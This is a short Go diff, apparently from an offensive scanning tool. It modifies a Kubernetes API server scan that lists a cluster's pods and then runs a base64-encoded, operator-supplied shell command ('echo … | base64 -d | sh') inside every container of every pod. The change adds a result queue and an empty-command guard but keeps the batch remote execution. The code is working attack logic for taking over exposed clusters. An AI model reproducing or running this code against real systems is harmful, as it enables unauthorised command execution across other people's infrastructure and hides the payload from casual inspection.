@@ -42,19 +42,24 @@ func KubeAPIServerScan(info *common.HostInfo) bool {
 	}
 	result := fmt.Sprintf("[%s:%s] There are %d pods in the cluster.", info.Host, info.Port, len(pods.Items))
 	log.Println(result)
+	if info.Queue != nil {
+		info.Queue.Push(result)
+	}
 
 	// batch command execution
 	cmd := info.Command.TCPCommand
-	b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
+	if cmd != "" {
+		b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
 
-	var kubeconf = &KubeAPIConfig{
-		Command:   fmt.Sprintf("echo %s | base64 -d | sh", b64),
-		Clientset: clientset,
-		Config:    config,
-	}
-	for _, p := range pods.Items {
-		for _, c := range p.Spec.Containers {
-			kubeconf.kubeAPIExec(p.Name, p.Namespace, c.Name)
+		var kubeconf = &KubeAPIConfig{
+			Command:   fmt.Sprintf("echo %s | base64 -d | sh", b64),
+			Clientset: clientset,
+			Config:    config,
+		}
+		for _, p := range pods.Items {
+			for _, c := range p.Spec.Containers {
+				kubeconf.kubeAPIExec(p.Name, p.Namespace, c.Name)
+			}
 		}
 	}
 	return true
